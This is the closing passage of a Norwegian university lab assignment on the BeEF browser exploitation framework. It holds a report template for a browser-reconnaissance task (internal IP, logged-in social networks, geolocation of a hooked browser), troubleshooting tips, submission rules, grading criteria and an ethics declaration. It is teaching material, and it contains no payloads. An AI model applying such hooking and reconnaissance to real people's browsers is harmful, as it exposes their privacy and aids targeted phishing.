> 📸 **Screenshot 11:** Target Profile HTML

---

## Leveranse for Oppgave 3

### 📄 Omfattende rapport

**Filnavn:** `Oppgave3_BrowserDetective_[DittNavn].md`

**Innhold:**

```markdown
# Oppgave 3: Browser Detective

**Student:** [Ditt navn]
**Dato:** [Dato]

## 1. Screenshots

### Screenshot 7: System Info
[Lim inn]

### Screenshot 8: Internal IP
[Lim inn]

### Screenshot 9: Social Networks
[Lim inn]

### Screenshot 10: Geolocation
[Lim inn]

### Screenshot 11: Target Profile HTML
[Lim inn]

## 2. Komplett Target Profil

[Lim inn hele reconnaissance-rapporten]

## 3. Informasjonsverdivurdering

### Hvilken informasjon var mest verdifull for en angriper?

[Ranger top 5 og forklar hvorfor]

1. Internal IP address - fordi...
2. Browser version - fordi...
3. ...

### Hvilken informasjon var minst nyttig?

[Forklar]

## 4. Privacy analyse

### Hvor mye kan en nettside vite om deg?

[Diskuter basert på dine funn]

### Er dette akseptabelt?

[Din mening]

## 5. Real-world implikasjoner

### Scenario 1: Målrettet phishing

Basert på informasjonen samlet, beskriv hvordan en angriper kunne lage et svært målrettet phishing-angrep:

[Ditt scenario]

### Scenario 2: Corporate espionage

Hvis dette var en ansatt i et firma, hvordan kunne informasjonen brukes?

[Ditt scenario]

## 6. Defensive tiltak

### For brukeren:

1. ...
2. ...
3. ...

### For utviklere:

1. ...
2. ...
3. ...

### For nettverksadministratorer:

1. ...
2. ...
3. ...

## 7. Etisk refleksjon

### Når er reconnaissance lovlig?

[Dine tanker]

### Hvor går grensen?

[Dine tanker]

### Hvordan sikre etisk bruk av pentest-verktøy?

[Dine tanker]

## 8. Sammenligning med andre verktøy

Sammenlign BeeF reconnaissance med:
- Nmap
- Shodan
- theHarvester

Hva er forskjellene?

[Din analyse]

## 9. Konklusjon

Hva har du lært om:
- Browser fingerprinting?
- Privacy på nettet?
- Reconnaissance i cybersikkerhet?

[Dine refleksjoner]
```

---

## ❓ Feilsøking Oppgave 3

### Problem: Kan ikke finne Internal IP

**Løsning:**
WebRTC må være aktivert. Sjekk:
```javascript
// I browser console (F12)
navigator.mediaDevices.enumerateDevices()
```

### Problem: Social Networks viser alle som "Unknown"

**Løsning:**
Dette er normalt hvis brukeren ikke er innlogget på noen sosiale medier. Test ved å faktisk logge inn på Facebook/LinkedIn i en annen tab (samme browser).

### Problem: Geolocation gir ingen data

**Løsning:**
Brukeren må tillate location access. Når BeeF ber om tilgang, klikk "Tillat" i Windows nettleseren.

---

# Innlevering

## 📦 Hva skal leveres?

### For alle tre oppgavene, lever:

1. **Markdown-rapporter:**
   - `Oppgave1_FirstHook_[DittNavn].md`
   - `Oppgave2_CookieMonster_[DittNavn].md`
   - `Oppgave3_BrowserDetective_[DittNavn].md`

2. **Screenshots (totalt ~11 bilder):**
   - Organiser i en mappe: `screenshots/`
   - Navn bildene tydelig: `oppgave1_screenshot1.png` etc.

3. **HTML-filer du laget:**
   - `index.html` (Kåres Kaffebar)
   - `cookies-demo.html` (Login-side)
   - `target-profile.html` (Target profil)

4. **En samlet README.md:**
   ```markdown
   # BeeF Lab - Grunnleggende Oppgaver
   
   **Student:** [Ditt navn]
   **Klasse:** Bachelor Digital infrastruktur og cybersikkerhet 1. semester
   **Dato:** [Dato]
   
   ## Innhold
   
   - Oppgave 1: First Hook (se Oppgave1_FirstHook.md)
   - Oppgave 2: Cookie Monster (se Oppgave2_CookieMonster.md)
   - Oppgave 3: Browser Detective (se Oppgave3_BrowserDetective.md)
   
   ## Refleksjon
   
   [Kort oppsummering av hva du lærte totalt]
   
   ## Etisk erklæring
   
   Jeg bekrefter at:
   - Alle tester ble utført i et isolert lab-miljø
   - Ingen angrep ble utført mot systemer jeg ikke eier
   - Jeg forstår de juridiske og etiske implikasjonene
   
   Signatur: [Ditt navn]
   Dato: [Dato]
   ```

## 📁 Mappestruktur

```
beef-lab-innlevering/
├── README.md
├── Oppgave1_FirstHook_[DittNavn].md
├── Oppgave2_CookieMonster_[DittNavn].md
├── Oppgave3_BrowserDetective_[DittNavn].md
├── html-files/
│   ├── index.html
│   ├── cookies-demo.html
│   └── target-profile.html
└── screenshots/
    ├── oppgave1_screenshot1.png
    ├── oppgave1_screenshot2.png
    ├── ...
    └── oppgave3_screenshot11.png
```

## 💾 Hvordan levere

**Alternativ 1: ZIP-fil**
```bash
cd ~/beef-lab
zip -r beef-lab-innlevering-[DittNavn].zip *
```

**Alternativ 2: Git repository**
```bash
cd ~/beef-lab
git init
git add .
git commit -m "BeeF lab grunnleggende oppgaver"
git remote add origin [DIN-REPO-URL]
git push
```

---

## 🎓 Vurderingskriterier

| Kriterium | Vekt | Beskrivelse |
|-----------|------|-------------|
| **Teknisk gjennomføring** | 40% | Fullførte alle steg korrekt |
| **Dokumentasjon** | 25% | Grundige rapporter med screenshots |
| **Forståelse** | 20% | Forklarer konsepter med egne ord |
| **Etisk bevissthet** | 10% | Viser forståelse for etiske aspekter |
| **Presentasjon** | 5% | Ryddig og profesjonell innlevering |

---

## ✅ Sjekkliste før innlevering

- [ ] Alle tre rapporter er komplette
- [ ] Alle screenshots er inkludert og tydelige
- [ ] HTML-filer er vedlagt
- [ ] README.md er ferdig
- [ ] Etisk erklæring er signert
- [ ] Mappestruktur er korrekt
- [ ] Alle filer er navngitt riktig
- [ ] Ingen personlig/sensitiv informasjon er inkludert
- [ ] Jeg har lest gjennom alt én gang til

---

## 🎉 Gratulerer!

Du har nå fullført de grunnleggende BeeF-oppgavene og har:
- ✅ Forstått XSS og browser hooking
- ✅ Lært om cookie security
- ✅ Utført browser reconnaissance
- ✅ Fått innsikt i web security

**Neste steg:** Gå videre til mellomvare eller avanserte oppgaver! 🚀

---

**Lykke til!** 🔒

*NTNU - Digital infrastruktur og cybersikkerhet*